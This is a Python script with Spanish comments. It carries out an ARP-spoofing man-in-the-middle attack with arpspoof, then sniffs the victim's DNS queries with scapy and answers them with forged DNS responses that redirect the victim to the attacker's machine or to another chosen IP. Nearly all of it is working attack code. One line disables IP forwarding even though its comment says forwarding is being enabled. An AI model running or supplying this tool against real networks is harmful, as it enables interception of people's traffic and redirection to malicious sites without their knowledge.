import traceback, sys, subprocess, netifaces, os, threading
from scapy.all import *

threads = []

""" Lanza un comando a traves de un Popen, tratando
excepciones, sin mostrar nada por terminal

:param cmd: comando a ejecutar (en string)

:return sub: subprocess
:return lines: output
"""
def cmd(cmd):
	try:
		sub = subprocess.Popen(cmd, shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.STDOUT)
		lines = sub.stdout.read().decode()

		return sub, lines

	except subprocess.CalledProcessError:
		traceback.print_exc(file=sys.stdout)
		sys.exit(0)

""" Devuelve informacion del sistema: ip y 
 dispositivo de red

:return device: dispositivo de red
:return ip_address: direccion ip local
:return gateway: puerta de enlace predeterminada
"""
def get_info():
	# Obtenemos el dispositivo de red
	sub, output = cmd('nmcli -t -f device dev')
	lines = output.splitlines()
	device = lines[0]

	# Obtenemos la direccion ip
	sub, output = cmd('hostname -I')
	ip_address = output

	# Obtenemos el gateway del sistema
	gws = netifaces.gateways()
	gateway = gws['default'][netifaces.AF_INET][0]

	return device, ip_address, gateway

""" Mata todos los procesos de arpspoof
"""
def kill_arpspoof():

	#Obtenemos una lista de pid's de comandos arpspoof
	sub, output = cmd("ps aux | grep arpspoof | awk {'print $2'}")
	lines = output.splitlines()

	# Matamos uno a uno los procesos
	for proc in lines:
		command = "sudo kill " + str(proc)
		cmd(command)

	return

""" Realiza un ataque MiTM, redirigiendo los paquetes enviados por
el objetivo
:param device: interfaz de red de la maquina
:param target_ip: ip del objetivo
:param gateway: ip del router

:return sub1, sub2: identificadores de subrutinas
"""
def man_in_the_middle(device, target_ip, gateway):

	# Necesitamos activar el ip_forwarding para
	# que nuestra maquina reenvie los paquetes del objetivo
	cmd('echo 0 > /proc/sys/net/ipv4/ip_forward')

	# Ejecutamos arpspoof para interceptar trafico
	command1 = 'arpspoof -i ' + device + ' -t ' + target_ip + ' ' + gateway
	command2 = 'arpspoof -i ' + device + ' -t ' + gateway + ' ' + target_ip
	sub1 = subprocess.Popen(command1, shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.STDOUT)
	sub2 = subprocess.Popen(command2, shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.STDOUT)

	return sub1, sub2


""" Funcion que envia una respuesta DNS falsificada
:param tid: id del paquete DNS
:param port: puerto de conexion con la victima
:param dns_ip: ip del servidor al que trata de conectarse la victima

"""
def send_fake_response(tid, port, dns_ip, name, my_ip, target_ip, device, redirect):
	
	# Redirigimos a la victima a la IP redirect
	if len(redirect) > 0:
		my_ip = redirect

	ip = IP(src=dns_ip,dst=target_ip)
	udp = UDP(sport=53,dport=port)
	dnsqr = DNSQR(qname=name, qtype='A', qclass='IN')
	dnsrr = DNSRR(rrname=name, ttl=60000, type="A", rclass="IN", rdata=my_ip)
	dns = DNS(id=tid, qr=1, aa=0, rd=1, ra=1, rcode='ok', qd=dnsqr, an=dnsrr)


	pkt = ip/udp/dns

	

	send(pkt, iface=device, verbose=0)

""" Funcion a la que llamara el sniffer cuando detecte un paquete
Sera la encargada de filtrar las queries por nombre
:param name: nombre de la pagina objetivo. Si es None, no se filtra por pagina
:param my_ip: ip del sistema
:param target_ip: ip del objetivo
:param device: dispositivo de red
:param redirect: ip a la que redirigir a la victima. Si es None, se toma Localhost
"""
def response_iface(name, my_ip, target_ip, device, redirect):
	def response(pkt):
		pname = pkt[DNS].qd.qname[:-1]
		port = pkt[UDP].sport
		answer = pkt[UDP].qr
		dns_ip = pkt[IP].dst

		if len(name) > 0:
			
			if (pname == name) and answer == 0:

				tid = pkt[DNS].id

				send_fake_response(tid, port, dns_ip, name, str(my_ip).strip(), str(target_ip).strip(), device, redirect)
		elif answer == 0:

			tid = pkt[DNS].id

			send_fake_response(tid, port, dns_ip, pname, str(my_ip).strip(), str(target_ip).strip(), device, redirect)

	return response


def dns_spoofing(name, redirect, device, target_ip, my_ip):
	
	bpf_filt = 'udp port 53'

	sniff(filter=bpf_filt , iface=device, store=0, prn=response_iface(name, my_ip, target_ip, device, redirect))
